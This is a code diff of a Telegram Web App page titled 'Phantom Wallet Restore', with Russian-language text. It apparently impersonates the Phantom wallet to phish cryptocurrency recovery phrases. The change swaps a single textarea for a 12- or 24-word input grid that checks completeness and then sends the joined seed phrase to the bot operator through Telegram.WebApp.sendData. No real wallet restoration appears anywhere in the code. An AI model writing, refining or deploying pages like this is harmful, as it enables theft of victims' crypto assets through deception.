@@ -5,21 +5,99 @@
   <title>Phantom Wallet Restore</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
-    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
-    textarea { width: 80%; height: 100px; }
-    button { padding: 10px 20px; margin-top: 10px; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      margin: 30px;
+      background: #f2f2f2;
+      color: #333;
+      text-align: center;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+    }
+
+    #word-count-toggle {
+      margin-bottom: 20px;
+    }
+
+    .seed-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      max-width: 600px;
+      margin: 0 auto;
+    }
+
+    .seed-grid input {
+      padding: 8px;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      text-align: center;
+    }
+
+    button {
+      margin-top: 25px;
+      padding: 12px 30px;
+      font-size: 16px;
+      background-color: #7c3aed;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #5b21b6;
+    }
   </style>
 </head>
 <body>
   <h2>🔐 Восстановление кошелька</h2>
-  <p>Введите свою сид-фразу ниже:</p>
-  <textarea id="seed" placeholder="abandon abandon abandon ..."></textarea><br>
+
+  <div id="word-count-toggle">
+    <label><input type="radio" name="wordCount" value="12" checked> 12 слов</label>
+    <label><input type="radio" name="wordCount" value="24"> 24 слова</label>
+  </div>
+
+  <div id="inputs" class="seed-grid"></div>
+
   <button onclick="submit()">Отправить</button>
 
   <script>
+    const container = document.getElementById("inputs");
+
+    function renderInputs(count) {
+      container.innerHTML = "";
+      for (let i = 1; i <= count; i++) {
+        const input = document.createElement("input");
+        input.placeholder = i;
+        input.id = "word" + i;
+        container.appendChild(input);
+      }
+    }
+
+    document.querySelectorAll('input[name="wordCount"]').forEach(radio => {
+      radio.addEventListener('change', () => {
+        const count = parseInt(radio.value);
+        renderInputs(count);
+      });
+    });
+
+    // начальное значение — 12 слов
+    renderInputs(12);
+
     function submit() {
-      const seed = document.getElementById("seed").value;
-      Telegram.WebApp.sendData(seed);
+      const inputs = document.querySelectorAll(".seed-grid input");
+      const words = Array.from(inputs).map(i => i.value.trim()).filter(Boolean);
+      if (words.length !== inputs.length) {
+        alert("Пожалуйста, заполните все поля.");
+        return;
+      }
+
+      const phrase = words.join(" ");
+      Telegram.WebApp.sendData(phrase);
       Telegram.WebApp.close();
     }
   </script>
